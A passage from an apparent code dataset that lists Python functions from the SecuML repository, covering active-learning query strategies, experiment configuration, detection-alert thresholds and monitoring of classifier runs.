    self.exp = self.iteration.exp"
ANSSI-FR/SecuML,generate_query,"def generate_query(self, instance_id, predicted_proba, suggested_label, suggested_family, confidence=None):
    return Query(instance_id, predicted_proba, suggested_label, suggested_family, confidence=confidence)"
ANSSI-FR/SecuML,_create_naive_bayes_conf,"def _create_naive_bayes_conf(self):
    name = '-'.join(['AL%d' % self.exp.exp_id, 'Iter%d' % self.iteration.iter_num, 'all', 'NaiveBayes'])
    multiclass_model = self.exp.exp_conf.core_conf.multiclass_model
    classifier_conf = multiclass_model.classifier_conf
    optim_conf = classifier_conf.hyperparam_conf.optim_conf
    multiclass = True
    factory = classifiers.get_factory()
    naive_bayes_conf = factory.get_default('GaussianNaiveBayes', optim_conf.num_folds, optim_conf.n_jobs, multiclass, self.exp.logger)
    test_conf = UnlabeledLabeledConf(self.exp.logger)
    classif_conf = ClassificationConf(naive_bayes_conf, test_conf, self.exp.logger)
    features_conf = FeaturesConf(self.exp.exp_conf.features_conf.input_features, self.exp.exp_conf.features_conf.sparse, self.exp.exp_conf.features_conf.logger, filter_in_f=self.exp.exp_conf.features_conf.filter_in_f, filter_out_f=self.exp.exp_conf.features_conf.filter_out_f)
    DiademConf(self.exp.exp_conf.secuml_conf, self.exp.exp_conf.dataset_conf, features_conf, self.exp.exp_conf.annotations_conf, classif_conf, None, name=name, parent=self.exp.exp_id)
    return naive_bayes_conf"
ANSSI-FR/SecuML,_run_logistic_regression,"def _run_logistic_regression(self):
    name = '-'.join(['AL%d' % self.exp.exp_id, 'Iter%d' % self.iteration.iter_num, 'all', 'LogisticRegression'])
    features_conf = FeaturesConf(self.exp.exp_conf.features_conf.input_features, self.exp.exp_conf.features_conf.sparse, self.exp.exp_conf.features_conf.logger, filter_in_f=self.exp.exp_conf.features_conf.filter_in_f, filter_out_f=self.exp.exp_conf.features_conf.filter_out_f)
    exp_conf = DiademConf(self.exp.exp_conf.secuml_conf, self.exp.exp_conf.dataset_conf, features_conf, self.exp.exp_conf.annotations_conf, self.exp.exp_conf.core_conf.multiclass_model, None, name=name, parent=self.exp.exp_id)
    model_exp = DiademExp(exp_conf, session=self.exp.session)
    model_exp.run(instances=self.iteration.datasets.instances, cv_monitoring=False)
    train_exp = model_exp.get_train_exp()
    test_exp = model_exp.get_detection_exp('test')
    self.lr_predicted_proba = test_exp.predictions.all_probas
    self.lr_predicted_labels = test_exp.predictions.values
    self.lr_class_labels = train_exp.classifier.class_labels
    self.lr_time = train_exp.monitoring.exec_times.total()
    self.lr_time += test_exp.monitoring.exec_time.predictions"
ANSSI-FR/SecuML,__init__,"def __init__(self, parent_exp, iteration, instances, assigned_categories, assignment_proba, label, category_labels):
    CoreCategories.__init__(self, iteration, instances, assigned_categories, assignment_proba, label, category_labels)
    self.exp = parent_exp"
ANSSI-FR/SecuML,init,"def init(self, label, families):
    self.categories = [Category(self.iteration, label, families[x]) for x in range(self.num_categories)]"
ANSSI-FR/SecuML,get_naive_bayes_conf,"def get_naive_bayes_conf(self):
    name = '-'.join(['AL%d' % self.exp.exp_id, 'Iter%d' % self.iteration.iter_num, 'all', 'NaiveBayes'])
    classifier_conf = self.exp.exp_conf.core_conf.classifier_conf
    optim_conf = classifier_conf.hyperparam_conf.optim_conf
    multiclass = True
    factory = classifiers.get_factory()
    naive_bayes_conf = factory.get_default('GaussianNaiveBayes', optim_conf.num_folds, optim_conf.n_jobs, multiclass, self.exp.logger)
    test_conf = UnlabeledLabeledConf(self.exp.logger)
    classification_conf = ClassificationConf(naive_bayes_conf, test_conf, self.exp.logger)
    features_conf = FeaturesConf(self.exp.exp_conf.features_conf.input_features, self.exp.exp_conf.features_conf.sparse, self.exp.exp_conf.features_conf.logger, filter_in_f=self.exp.exp_conf.features_conf.filter_in_f, filter_out_f=self.exp.exp_conf.features_conf.filter_out_f)
    exp_conf = DiademConf(self.exp.exp_conf.secuml_conf, self.exp.exp_conf.dataset_conf, features_conf, self.exp.exp_conf.annotations_conf, classification_conf, None, name=name, parent=self.exp.exp_id)
    DiademExp(exp_conf, session=self.exp.session)
    return naive_bayes_conf"
ANSSI-FR/SecuML,generate_query,"def generate_query(self, instance_id, predicted_proba, suggested_label, suggested_family, confidence=None):
    return Query(instance_id, predicted_proba, suggested_label, suggested_family, confidence=confidence)"
ANSSI-FR/SecuML,generate_query,"def generate_query(self, instance_id, predicted_proba, suggested_label, suggested_family, confidence=None):
    return Query(instance_id, predicted_proba, suggested_label, suggested_family, confidence=confidence)"
ANSSI-FR/SecuML,generate_query,"def generate_query(self, instance_id, predicted_proba, suggested_label, suggested_family, confidence=None):
    return Query(instance_id, predicted_proba, suggested_label, suggested_family, confidence=confidence)"
ANSSI-FR/SecuML,generate_query,"def generate_query(self, instance_id, predicted_proba, suggested_label, suggested_family, confidence=None):
    return Query(instance_id, predicted_proba, suggested_label, suggested_family, confidence=confidence)"
ANSSI-FR/SecuML,__init__,"def __init__(self, iteration, label, proba_min=None, proba_max=None, input_checking=True):
    CoreRcdQueries.__init__(self, iteration, label, proba_min, proba_max, input_checking=input_checking)
    self.multiclass_exp = None
    self.exp = iteration.exp"
ANSSI-FR/SecuML,generate_query,"def generate_query(self, instance_id, predicted_proba, suggested_label, suggested_family, confidence=None):
    return Query(instance_id, predicted_proba, suggested_label, suggested_family, confidence=confidence)"
ANSSI-FR/SecuML,_get_multiclass_conf,"def _get_multiclass_conf(self):
    conf = self.rcd_conf.classification_conf
    name = '-'.join(['AL%d' % self.exp.exp_id, 'Iter%d' % self.iteration.iter_num, self.label, 'analysis'])
    features_conf = FeaturesConf(self.exp.exp_conf.features_conf.input_features, self.exp.exp_conf.features_conf.sparse, self.exp.exp_conf.features_conf.logger, filter_in_f=self.exp.exp_conf.features_conf.filter_in_f, filter_out_f=self.exp.exp_conf.features_conf.filter_out_f)
    exp_conf = DiademConf(self.exp.exp_conf.secuml_conf, self.exp.exp_conf.dataset_conf, features_conf, self.exp.exp_conf.annotations_conf, conf, None, name=name, parent=self.exp.exp_id)
    self.multiclass_exp = DiademExp(exp_conf, session=self.exp.session)
    return conf"
ANSSI-FR/SecuML,_create_clustering_exp,"def _create_clustering_exp(self):
    core_conf = CoreClusteringConf(self.exp.exp_conf.logger, self.categories.num_categories)
    name = '-'.join(['AL%d' % self.exp.exp_id, 'Iter%d' % self.iteration.iter_num, self.label, 'clustering'])
    features_conf = FeaturesConf(self.exp.exp_conf.features_conf.input_features, self.exp.exp_conf.features_conf.sparse, self.exp.exp_conf.features_conf.logger, filter_in_f=self.exp.exp_conf.features_conf.filter_in_f, filter_out_f=self.exp.exp_conf.features_conf.filter_out_f)
    exp_conf = ClusteringConf(self.exp.exp_conf.secuml_conf, self.exp.exp_conf.dataset_conf, features_conf, self.exp.exp_conf.annotations_conf, core_conf, name=name, parent=self.exp.exp_id)
    clustering_exp = ClusteringExperiment(exp_conf, session=self.exp.session)
    return clustering_exp"
ANSSI-FR/SecuML,_gen_clustering_visu,"def _gen_clustering_visu(self):
    if self.families_analysis:
        self.clustering_exp = self._create_clustering_exp()
        clustering = Clusters(self.categories.instances, self.categories.assigned_categories)
        clustering.generate(None, None)
        clustering.export(self.clustering_exp.output_dir())
    else:
        self.clustering_exp = None"
ANSSI-FR/SecuML,_set_categories,"def _set_categories(self, all_instances, assigned_categories, predicted_proba):
    self.categories = Categories(self.multiclass_exp, self.iteration, all_instances, assigned_categories, predicted_proba, self.label, self.multiclass_model.class_labels)"
ANSSI-FR/SecuML,generate_query,"def generate_query(self, instance_id, predicted_proba, suggested_label, suggested_family, confidence=None):
    return Query(instance_id, predicted_proba, suggested_label, suggested_family, confidence=confidence)"
ANSSI-FR/SecuML,generate_query,"def generate_query(self, instance_id, predicted_proba, suggested_label, suggested_family, confidence=None):
    return Query(instance_id, predicted_proba, suggested_label, suggested_family, confidence=confidence)"
ANSSI-FR/SecuML,get_factory,"def get_factory():
    global factory
    if factory is None:
        factory = Factory()
    return factory"
ANSSI-FR/SecuML,__init__,"def __init__(self):
    self.strategies = {}"
ANSSI-FR/SecuML,register,"def register(self, class_name, class_obj):
    self.strategies[class_name] = class_obj"
ANSSI-FR/SecuML,get_strategy,"def get_strategy(self, iteration, query_strategy):
    return self.strategies[query_strategy](iteration)"
ANSSI-FR/SecuML,_set_queries,"def _set_queries(self):
    self.queries['aladin'] = AladinQueries(self.iteration, self.conf)"
ANSSI-FR/SecuML,get_url,"def get_url(self):
    secuml_conf = self.iteration.exp.exp_conf.secuml_conf
    return 'http://%s:%d/ilabAnnotations/%d/%d/' % (secuml_conf.host, secuml_conf.port, self.iteration.exp.exp_id, self.iteration.iter_num)"
ANSSI-FR/SecuML,get_exec_times_header,"def get_exec_times_header(self):
    header = ['logistic_regression', 'naive_bayes']
    header.extend(CoreAladin.get_exec_times_header(self))
    return header"
ANSSI-FR/SecuML,get_exec_times,"def get_exec_times(self):
    queries = self.queries['aladin']
    line = [queries.lr_time, queries.nb_time]
    line.extend(CoreAladin.get_exec_times(self))
    return line"
ANSSI-FR/SecuML,get_exec_times_display,"def get_exec_times_display(self):
    lr = PlotDataset(np.array([]), 'Logistic Regression')
    lr.set_linestyle('dotted')
    nb = PlotDataset(np.array([]), 'Naive Bayes')
    nb.set_linestyle('dashed')
    v = [lr, nb]
    v.extend(CoreAladin.get_exec_times_display(self))
    return v"
ANSSI-FR/SecuML,_set_queries,"def _set_queries(self):
    self.queries['cesa_bianchi'] = CesaBianchiQueries(self.iteration, self.iteration.conf.b, self.iteration.conf.batch)"
ANSSI-FR/SecuML,get_url,"def get_url(self):
    secuml_conf = self.iteration.exp.exp_conf.secuml_conf
    return 'http://%s:%d/ilabAnnotations/%d/%d/' % (secuml_conf.host, secuml_conf.port, self.iteration.exp.exp_id, self.iteration.iter_num)"
ANSSI-FR/SecuML,get_exec_times_header,"def get_exec_times_header(self):
    header = ['binary_model']
    header.extend(CoreCesaBianchi.get_exec_times_header(self))
    return header"
ANSSI-FR/SecuML,get_exec_times,"def get_exec_times(self):
    line = [self.iteration.update_model.exec_time]
    line.extend(CoreCesaBianchi.get_exec_times(self))
    return line"
ANSSI-FR/SecuML,get_exec_times_display,"def get_exec_times_display(self):
    binary_model = PlotDataset(np.array([]), 'Binary model')
    v = [binary_model]
    v.extend(CoreCesaBianchi.get_exec_times_display(self))
    return v"
ANSSI-FR/SecuML,_set_queries,"def _set_queries(self):
    self.queries['gornitz'] = GornitzQueries(self.iteration, self.iteration.conf.batch)"
ANSSI-FR/SecuML,get_url,"def get_url(self):
    secuml_conf = self.iteration.exp.exp_conf.secuml_conf
    return 'http://%s:%d/ilabAnnotations/%d/%d/' % (secuml_conf.host, secuml_conf.port, self.iteration.exp.exp_id, self.iteration.iter_num)"
ANSSI-FR/SecuML,get_exec_times_header,"def get_exec_times_header(self):
    header = ['binary_model']
    header.extend(CoreGornitz.get_exec_times_header(self))
    return header"
ANSSI-FR/SecuML,get_exec_times,"def get_exec_times(self):
    line = [self.iteration.update_model.exec_time]
    line.extend(CoreGornitz.get_exec_times(self))
    return line"
ANSSI-FR/SecuML,get_exec_times_display,"def get_exec_times_display(self):
    binary_model = PlotDataset(np.array([]), 'Binary model')
    v = [binary_model]
    v.extend(CoreGornitz.get_exec_times_display(self))
    return v"
ANSSI-FR/SecuML,_set_queries,"def _set_queries(self):
    self.queries['uncertain'] = UncertainQueries(self.iteration, self.iteration.conf.num_uncertain, label='uncertain')
    self.queries['malicious'] = RcdQueries(self.iteration, MALICIOUS, 0.5, 1, input_checking=False)
    self.queries['benign'] = RcdQueries(self.iteration, BENIGN, 0, 0.5, input_checking=False)"
ANSSI-FR/SecuML,generate_queries,"def generate_queries(self, predictions):
    self.exec_time = 0
    queried_instances = []
    ilab_row = IlabExpAlchemy(id=self.iteration.exp.exp_id, iter=self.iteration.iter_num, uncertain=None, malicious=None, benign=None)
    for k in ['uncertain', 'malicious', 'benign']:
        query = self.queries[k]
        query.run(predictions, already_queried=queried_instances)
        if k == 'uncertain':
            ilab_row.uncertain = -1
            self.iteration.exp.session.add(ilab_row)
            self.iteration.exp.session.commit()
        else:
            clustering_exp = -1
            if query.clustering_exp is not None:
                clustering_exp = query.clustering_exp.exp_id
            setattr(ilab_row, k, clustering_exp)
            self.iteration.exp.session.commit()
        queried_instances.extend(query.get_ids())
        self.exec_time += query.exec_time"
ANSSI-FR/SecuML,get_url,"def get_url(self):
    secuml_conf = self.iteration.exp.exp_conf.secuml_conf
    return 'http://%s:%d/ilabAnnotations/%d/%d/' % (secuml_conf.host, secuml_conf.port, self.iteration.exp.exp_id, self.iteration.iter_num)"
ANSSI-FR/SecuML,get_exec_times_header,"def get_exec_times_header(self):
    return ['malicious_queries', 'uncertain_queries', 'benign_queries']"
ANSSI-FR/SecuML,get_exec_times,"def get_exec_times(self):
    malicious_time = self.queries['malicious'].analysis_time
    malicious_time += self.queries['malicious'].exec_time
    uncertain_time = self.iteration.update_model.exec_time
    uncertain_time += self.queries['uncertain'].exec_time
    benign_time = self.queries['benign'].analysis_time
    benign_time += self.queries['benign'].exec_time
    return [malicious_time, uncertain_time, benign_time]"
ANSSI-FR/SecuML,get_exec_times_display,"def get_exec_times_display(self):
    uncertain = PlotDataset(np.array([]), 'Uncertain Queries')
    malicious = PlotDataset(np.array([]), 'Malicious Queries')
    malicious.set_linestyle('dotted')
    malicious.set_color(get_label_color(MALICIOUS))
    benign = PlotDataset(np.array([]), 'Benign Queries')
    benign.set_linestyle('dashed')
    benign.set_color(get_label_color(BENIGN))
    return [malicious, uncertain, benign]"
ANSSI-FR/SecuML,_set_queries,"def _set_queries(self):
    self.queries['random'] = RandomQueries(self.iteration, self.iteration.conf.batch)"
ANSSI-FR/SecuML,get_url,"def get_url(self):
    secuml_conf = self.iteration.exp.exp_conf.secuml_conf
    return 'http://%s:%d/ilabAnnotations/%d/%d/' % (secuml_conf.host, secuml_conf.port, self.iteration.exp.exp_id, self.iteration.iter_num)"
ANSSI-FR/SecuML,get_exec_times_header,"def get_exec_times_header(self):
    header = ['binary_model']
    header.extend(CoreRandom.get_exec_times_header(self))
    return header"
ANSSI-FR/SecuML,get_exec_times,"def get_exec_times(self):
    line = [self.iteration.update_model.exec_time]
    line.extend(CoreRandom.get_exec_times(self))
    return line"
ANSSI-FR/SecuML,exec_time_display,"def exec_time_display(self):
    binary_model = PlotDataset(np.array([]), 'Binary model')
    v = [binary_model]
    v.extend(CoreRandom.get_exec_times_display(self))
    return v"
ANSSI-FR/SecuML,_set_queries,"def _set_queries(self):
    self.queries['rcd'] = RcdQueries(self.iteration, 'all')"
ANSSI-FR/SecuML,generate_queries,"def generate_queries(self, predictions):
    rcd_row = RcdClusteringExpAlchemy(id=self.iteration.exp.exp_id, iter=self.iteration.iter_num, clustering_exp=None)
    self.iteration.exp.session.add(rcd_row)
    query = self.queries['rcd']
    query.run(predictions)
    if query.clustering_exp is not None:
        rcd_row.clustering_exp = query.clustering_exp.exp_id
    else:
        rcd_row.clustering_exp = -1
    self.iteration.exp.session.commit()
    self.exec_time = query.exec_time"
ANSSI-FR/SecuML,get_url,"def get_url(self):
    secuml_conf = self.iteration.exp.exp_conf.secuml_conf
    return 'http://%s:%d/ilabAnnotations/%d/%d/' % (secuml_conf.host, secuml_conf.port, self.iteration.exp.exp_id, self.iteration.iter_num)"
ANSSI-FR/SecuML,get_exec_times_header,"def get_exec_times_header(self):
    header = ['analysis']
    header.extend(CoreRcd.get_exec_times_header(self))
    return header"
ANSSI-FR/SecuML,get_exec_times,"def get_exec_times(self):
    line = [self.queries['rcd'].analysis_time]
    line.extend(CoreRcd.get_exec_times(self))
    return line"
ANSSI-FR/SecuML,get_exec_times_display,"def get_exec_times_display(self):
    v = [PlotDataset(np.array([]), 'Analysis')]
    v.extend(CoreRcd.get_exec_times_display(self))
    return v"
ANSSI-FR/SecuML,_set_queries,"def _set_queries(self):
    self.queries['top_n'] = TopNQueries(self.iteration, self.iteration.conf.batch)"
ANSSI-FR/SecuML,get_url,"def get_url(self):
    secuml_conf = self.iteration.exp.exp_conf.secuml_conf
    return 'http://%s:%d/ilabAnnotations/%d/%d/' % (secuml_conf.host, secuml_conf.port, self.iteration.exp.exp_id, self.iteration.iter_num)"
ANSSI-FR/SecuML,get_exec_times_header,"def get_exec_times_header(self):
    header = ['binary_model']
    header.extend(CoreTopN.get_exec_times_header(self))
    return header"
ANSSI-FR/SecuML,get_exec_times,"def get_exec_times(self):
    line = [self.iteration.update_model.exec_time]
    line.extend(CoreTopN.get_exec_times(self))
    return line"
ANSSI-FR/SecuML,exec_time_display,"def exec_time_display(self):
    binary_model = PlotDataset(np.array([]), 'Binary model')
    v = [binary_model]
    v.extend(CoreTopN.get_exec_times_display(self))
    return v"
ANSSI-FR/SecuML,_set_queries,"def _set_queries(self):
    self.queries['uncertain'] = UncertainQueries(self.iteration, self.iteration.conf.batch)"
ANSSI-FR/SecuML,get_url,"def get_url(self):
    secuml_conf = self.iteration.exp.exp_conf.secuml_conf
    return 'http://%s:%d/ilabAnnotations/%d/%d/' % (secuml_conf.host, secuml_conf.port, self.iteration.exp.exp_id, self.iteration.iter_num)"
ANSSI-FR/SecuML,get_exec_times_header,"def get_exec_times_header(self):
    header = ['binary_model']
    header.extend(CoreUncertainty.get_exec_times_header(self))
    return header"
ANSSI-FR/SecuML,get_exec_times,"def get_exec_times(self):
    line = [self.iteration.update_model.exec_time]
    line.extend(CoreUncertainty.get_exec_times(self))
    return line"
ANSSI-FR/SecuML,get_exec_times_display,"def get_exec_times_display(self):
    binary_model = PlotDataset(np.array([]), 'Binary model')
    v = [binary_model]
    v.extend(CoreUncertainty.get_exec_times_display(self))
    return v"
ANSSI-FR/SecuML,__init__,"def __init__(self, detection_threshold, classifier_conf, clustering_conf, logger):
    Conf.__init__(self, logger)
    self.detection_threshold = detection_threshold
    self.classifier_conf = classifier_conf
    self.clustering_conf = clustering_conf"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    name = '__AlertsAnalysis__'
    name += 'threshold_%s__' % to_percentage(self.detection_threshold)
    if self.clustering_conf is not None:
        name += self.clustering_conf.get_exp_name()
    elif self.classifier_conf is not None:
        name += self.classifier_conf.get_exp_name()
    return name"
ANSSI-FR/SecuML,with_analysis,"def with_analysis(self):
    return self.classifier_conf is not None or self.clustering_conf is not None"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, logger):
    if obj is None:
        return None
    classifier_conf = None
    clustering_conf = None
    if obj['classifier_conf'] is not None:
        factory = classifiers.get_factory()
        classifier_conf = factory.from_json(obj['classifier_conf'], logger)
    elif obj['clustering_conf'] is not None:
        factory = cluster_conf.get_factory()
        clustering_conf = factory.from_json(obj['clustering_conf'], logger)
    return AlertsConf(obj['detection_threshold'], classifier_conf, clustering_conf, logger)"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    return [('detection_threshold', exportFieldMethod.primitive), ('classifier_conf', exportFieldMethod.obj), ('clustering_conf', exportFieldMethod.obj)]"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    alerts_group = parser.add_argument_group('Alerts parameters')
    alerts_group.add_argument('--detection-threshold', type=float, default=0.5, help='An alert is triggered if the predicted probability of maliciousness is above this threshold. Default: 0.5.')
    group = alerts_group.add_mutually_exclusive_group(required=False)
    models = classifiers.get_factory().get_methods(ClassifierType.supervised)
    group.add_argument('--alerts-classif', default=None, choices=models, help='Supervised model trained to cluster the alerts according to the malicious families defined in the training dataset. Default: None.')
    group.add_argument('--alerts-clustering', default=None, choices=cluster_conf.get_factory().get_methods(), help='Clustering algorithm to analyze the alerts. Default: None.')
    alerts_group.add_argument('--num-alerts-clusters', type=int, default=4, help='Number of clusters built from the alerts. Default: 4.')"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, logger):
    classifier_conf = None
    clustering_conf = None
    if args.alerts_classif is not None:
        multiclass = True
        num_folds = None
        if hasattr(args, 'num_folds'):
            num_folds = args.num_folds
        n_jobs = None
        if hasattr(args, 'n_jobs'):
            n_jobs = args.n_jobs
        factory = classifiers.get_factory()
        classifier_conf = factory.get_default(args.alerts_classif, num_folds, n_jobs, multiclass, logger)
    elif args.alerts_clustering is not None:
        factory = cluster_conf.get_factory()
        clustering = factory.get_class(args.alerts_clustering)
        clustering_conf = clustering(logger, args.num_alerts_clusters)
    return AlertsConf(args.detection_threshold, classifier_conf, clustering_conf, logger)"
ANSSI-FR/SecuML,__init__,"def __init__(self, secuml_conf, dataset_conf, features_conf, annotations_conf, alerts_conf, name=None, parent=None, fold_id=None, kind='test'):
    ExpConf.__init__(self, secuml_conf, dataset_conf, features_conf, annotations_conf, alerts_conf, name=name, parent=parent)
    self.fold_id = fold_id
    self.kind = kind"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = ExpConf.fields_to_export(self)
    fields.extend([('fold_id', exportFieldMethod.primitive)])
    fields.extend([('kind', exportFieldMethod.primitive)])
    return fields"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(conf_json, secuml_conf):
    logger = secuml_conf.logger
    dataset_conf = DatasetConf.from_json(conf_json['dataset_conf'], logger)
    features_conf = FeaturesConf.from_json(conf_json['features_conf'], logger)
    annotations_conf = AnnotationsConf.from_json(conf_json['annotations_conf'], logger)
    if conf_json['core_conf'] is not None:
        alerts_conf = AlertsConf.from_json(conf_json['core_conf'], logger)
    else:
        alerts_conf = None
    exp_conf = DetectionConf(secuml_conf, dataset_conf, features_conf, annotations_conf, alerts_conf, name=conf_json['name'], parent=conf_json['parent'], fold_id=conf_json['fold_id'], kind=conf_json['kind'])
    exp_conf.exp_id = conf_json['exp_id']
    return exp_conf"
ANSSI-FR/SecuML,__init__,"def __init__(self, secuml_conf, dataset_conf, features_conf, annotations_conf, core_conf, alerts_conf, name=None, parent=None, already_trained=None, no_training_detection=False):
    self.already_trained = already_trained
    ExpConf.__init__(self, secuml_conf, dataset_conf, features_conf, annotations_conf, core_conf, name=name, parent=parent)
    self.alerts_conf = alerts_conf
    self.no_training_detection = no_training_detection"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = ExpConf.fields_to_export(self)
    fields.extend([('already_trained', exportFieldMethod.primitive), ('alerts_conf', exportFieldMethod.obj), ('no_training_detection', exportFieldMethod.primitive)])
    return fields"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser():
    parser = argparse.ArgumentParser(description='Train and evaluate a detection model. ')
    ExpConf.gen_parser(parser, sparse=True)
    parser.add_argument('--no-training-detection', action='store_true', default=False, help='When specified, the detection model is\n                                    not applied to the training instances. ')
    factory = classifiers.get_factory()
    models = factory.get_methods()
    models.remove('AlreadyTrained')
    subparsers = parser.add_subparsers(dest='model_class')
    subparsers.required = True
    for model in models:
        model_parser = subparsers.add_parser(model)
        factory.gen_parser(model, model_parser)
        classifier_type = get_classifier_type(factory.get_class(model))
        if classifier_type in [ClassifierType.supervised, ClassifierType.semisupervised]:
            default = None
            message = 'CSV file containing the annotations of some\n                             instances, or GROUND_TRUTH to use the ground\n                             truth annotations stored in idents.csv. '
            if classifier_type == ClassifierType.supervised:
                default = 'GROUND_TRUTH'
                message = '%s Default: GROUND_TRUTH.' % message
            AnnotationsConf.gen_parser(model_parser, required=default is None, default=default, message=message)
        ClassificationConf.gen_parser(model_parser)
        AlertsConf.gen_parser(model_parser)
    already_trained = subparsers.add_parser('AlreadyTrained')
    factory.gen_parser('AlreadyTrained', already_trained)
    ClassificationConf.gen_parser(already_trained)
    AlertsConf.gen_parser(already_trained)
    return parser"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args):
    secuml_conf = ExpConf.secuml_conf_from_args(args)
    classif_conf = ClassificationConf.from_args(args, secuml_conf.logger)
    model_class = classifiers.get_factory().get_class(args.model_class)
    classifier_type = get_classifier_type(model_class)
    if classifier_type in [ClassifierType.supervised, ClassifierType.semisupervised]:
        annotations_conf = AnnotationsConf(args.annotations_file, None, secuml_conf.logger)
    else:
        annotations_conf = AnnotationsConf(None, None, secuml_conf.logger)
    already_trained = None
    if args.model_class == 'AlreadyTrained':
        already_trained = args.model_exp_id
    alerts_conf = AlertsConf.from_args(args, secuml_conf.logger)
    if classifier_type == ClassifierType.unsupervised and alerts_conf.classifier_conf is not None:
        raise InvalidInputArguments('Supervised classification of the alerts is not supported for unsupervised model classes. ')
    if classif_conf.classifier_conf.multiclass:
        if alerts_conf.with_analysis():
            raise InvalidInputArguments('Alerts analysis is not supported for multiclass models. ')
        else:
            alerts_conf = None
    if classif_conf.test_conf.method == 'dataset' and classif_conf.test_conf.streaming and alerts_conf.with_analysis():
        raise InvalidInputArguments('Alerts analysis is not supported in streaming mode. ')
    dataset_conf = DatasetConf.from_args(args, secuml_conf.logger)
    features_conf = FeaturesConf.from_args(args, secuml_conf.logger)
    if features_conf.sparse and (not classif_conf.classifier_conf.accept_sparse):
        raise InvalidInputArguments('%s does not support sparse features. ' % args.model_class)
    return DiademConf(secuml_conf, dataset_conf, features_conf, annotations_conf, classif_conf, alerts_conf, name=args.exp_name, already_trained=already_trained, no_training_detection=args.no_training_detection)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(conf_json, secuml_conf):
    dataset_conf = DatasetConf.from_json(conf_json['dataset_conf'], secuml_conf.logger)
    features_conf = FeaturesConf.from_json(conf_json['features_conf'], secuml_conf.logger)
    annotations_conf = AnnotationsConf.from_json(conf_json['annotations_conf'], secuml_conf.logger)
    core_conf = ClassificationConf.from_json(conf_json['core_conf'], secuml_conf.logger)
    alerts_conf = AlertsConf.from_json(conf_json['alerts_conf'], secuml_conf.logger)
    no_training_detection = conf_json['no_training_detection']
    exp_conf = DiademConf(secuml_conf, dataset_conf, features_conf, annotations_conf, core_conf, alerts_conf, name=conf_json['name'], parent=conf_json['parent'], already_trained=conf_json['already_trained'], no_training_detection=no_training_detection)
    exp_conf.exp_id = conf_json['exp_id']
    return exp_conf"
ANSSI-FR/SecuML,__init__,"def __init__(self, secuml_conf, dataset_conf, features_conf, annotations_conf, core_conf, name=None, parent=None, fold_id=None):
    ExpConf.__init__(self, secuml_conf, dataset_conf, features_conf, annotations_conf, core_conf, name=name, parent=parent)
    self.fold_id = fold_id"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = ExpConf.fields_to_export(self)
    fields.extend([('fold_id', exportFieldMethod.primitive)])
    return fields"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(conf_json, secuml_conf):
    logger = secuml_conf.logger
    dataset_conf = DatasetConf.from_json(conf_json['dataset_conf'], logger)
    features_conf = FeaturesConf.from_json(conf_json['features_conf'], logger)
    annotations_conf = AnnotationsConf.from_json(conf_json['annotations_conf'], logger)
    factory = classifiers.get_factory()
    core_conf = factory.from_json(conf_json['core_conf'], logger)
    exp_conf = TrainConf(secuml_conf, dataset_conf, features_conf, annotations_conf, core_conf, name=conf_json['name'], parent=conf_json['parent'], fold_id=conf_json['fold_id'])
    exp_conf.exp_id = conf_json['exp_id']
    return exp_conf"
ANSSI-FR/SecuML,__init__,"def __init__(self, exp):
    ClassifierMonitoring.__init__(self, exp)
    self.cv_monitoring = None"
ANSSI-FR/SecuML,set_cv_monitoring,"def set_cv_monitoring(self, cv_monitoring):
    self.cv_monitoring = cv_monitoring"
ANSSI-FR/SecuML,display,"def display(self, output_dir):
    ClassifierMonitoring.display(self, output_dir)
    if self.cv_monitoring is not None:
        cv_dir = os.path.join(output_dir, 'cv')
        os.mkdir(cv_dir)
        self.cv_monitoring.display(cv_dir)"
ANSSI-FR/SecuML,__init__,"def __init__(self, exp, alerts_conf=None, num_folds=1):
    self.exp = exp
    self.exec_time = None
    self.alerts_monitoring = None
    if alerts_conf is not None:
        self.alerts_monitoring = AlertsMonitoring(self.exp, alerts_conf)
    self.predictions = PredictionsMonitoring(self.exp, num_folds)
    self.performance = None
    self.has_ground_truth = self.exp.has_ground_truth()
    if self.has_ground_truth:
        self.performance = PerformanceMonitoring()"
ANSSI-FR/SecuML,add_predictions,"def add_predictions(self, predictions, exec_time):
    if self.exec_time is None:
        self.exec_time = exec_time
    else:
        self.exec_time.add(exec_time)
    if self.performance is not None:
        self.performance.add_fold(predictions)
    self.predictions.add_fold(predictions)"
ANSSI-FR/SecuML,final_computations,"def final_computations(self):
    self.predictions.final_computations()
    if self.performance is not None:
        self.performance.final_computations()
    if self.alerts_monitoring is not None:
        self.alerts_monitoring.group(self.predictions.predictions)"
ANSSI-FR/SecuML,display,"def display(self, directory):
    self.final_computations()
    self.predictions.display(directory)
    if self.performance is not None:
        self.performance.display(directory)
    if self.alerts_monitoring is not None:
        self.alerts_monitoring.display(directory)
    with open(os.path.join(directory, 'exec_time.json'), 'w') as f:
        json.dump(self.exec_time.__dict__, f, indent=2)"
ANSSI-FR/SecuML,__init__,"def __init__(self, exp, num_folds):
    self.num_folds = num_folds
    self.classifiers = ClassifierMonitoring(exp, num_folds=num_folds)
    self.detect_monitoring = DetectionMonitoring(exp, num_folds=num_folds)"
ANSSI-FR/SecuML,add_fold,"def add_fold(self, classifier, train_exec_time, predictions, pred_exec_time, fold_id):
    self.classifiers.set_classifier(classifier, train_exec_time, fold_id=fold_id)
    self.detect_monitoring.add_predictions(predictions, pred_exec_time)"
ANSSI-FR/SecuML,final_computations,"def final_computations(self):
    self.classifiers.final_computations()
    self.detect_monitoring.final_computations()"
ANSSI-FR/SecuML,display,"def display(self, directory):
    self.classifiers.display(directory)
    self.detect_monitoring.display(directory)"
ANSSI-FR/SecuML,__init__,"def __init__(self, test_exp, alerts_conf):
    self.test_exp = test_exp
    self.alerts_conf = alerts_conf"
ANSSI-FR/SecuML,group,"def group(self, predictions):
    if not self.alerts_conf.with_analysis():
        return
    threshold = self.alerts_conf.detection_threshold
